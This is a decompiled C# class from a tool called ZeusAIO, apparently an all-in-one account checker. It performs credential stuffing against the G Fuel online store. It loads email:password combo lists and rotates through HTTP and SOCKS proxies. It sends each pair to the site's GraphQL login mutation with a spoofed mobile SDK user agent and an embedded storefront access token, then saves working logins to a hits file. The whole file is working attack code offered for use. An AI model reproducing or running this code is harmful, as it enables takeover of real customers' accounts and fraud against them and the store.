// Decompiled with JetBrains decompiler
// Type: Gfuel.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Gfuel
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mobile Buy SDK Android/3.2.3/com.aeron.shopifycore.gfuel";
              httpRequest.KeepAliveTimeout = 5000;
              httpRequest.ReadWriteTimeout = 5000;
              httpRequest.ConnectTimeout = 5000;
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.UseCookies = true;
              httpRequest.KeepAlive = true;
              httpRequest.AddHeader("Accept", "application/json");
              httpRequest.AddHeader("X-BUY3-SDK-CACHE-FETCH-STRATEGY", "NETWORK_ONLY");
              httpRequest.AddHeader("X-BUY3-SDK-EXPIRE-TIMEOUT", "0");
              httpRequest.AddHeader("User-Agent", "Mobile Buy SDK Android/3.2.3/com.aeron.shopifycore.gfuel");
              httpRequest.AddHeader("X-SDK-Version", "3.2.3");
              httpRequest.AddHeader("X-SDK-Variant", "android");
              httpRequest.AddHeader("X-Shopify-Storefront-Access-Token", "21765aa7568fd627c44d68bde191f6c0");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              if (httpRequest.Post("https://gfuel.com/api/graphql", "mutation{customerAccessTokenCreate(input:{email:\"" + s[0] + "\",password:\"" + s[1] + "\"}){customerAccessToken{accessToken,expiresAt},userErrors{field,message}}}", "application/graphql; charset=utf-8").ToString().Contains("accessToken"))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - GFUEL] " + s[0] + s[1], Color.Green);
                Export.AsResult("/Gfuel_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
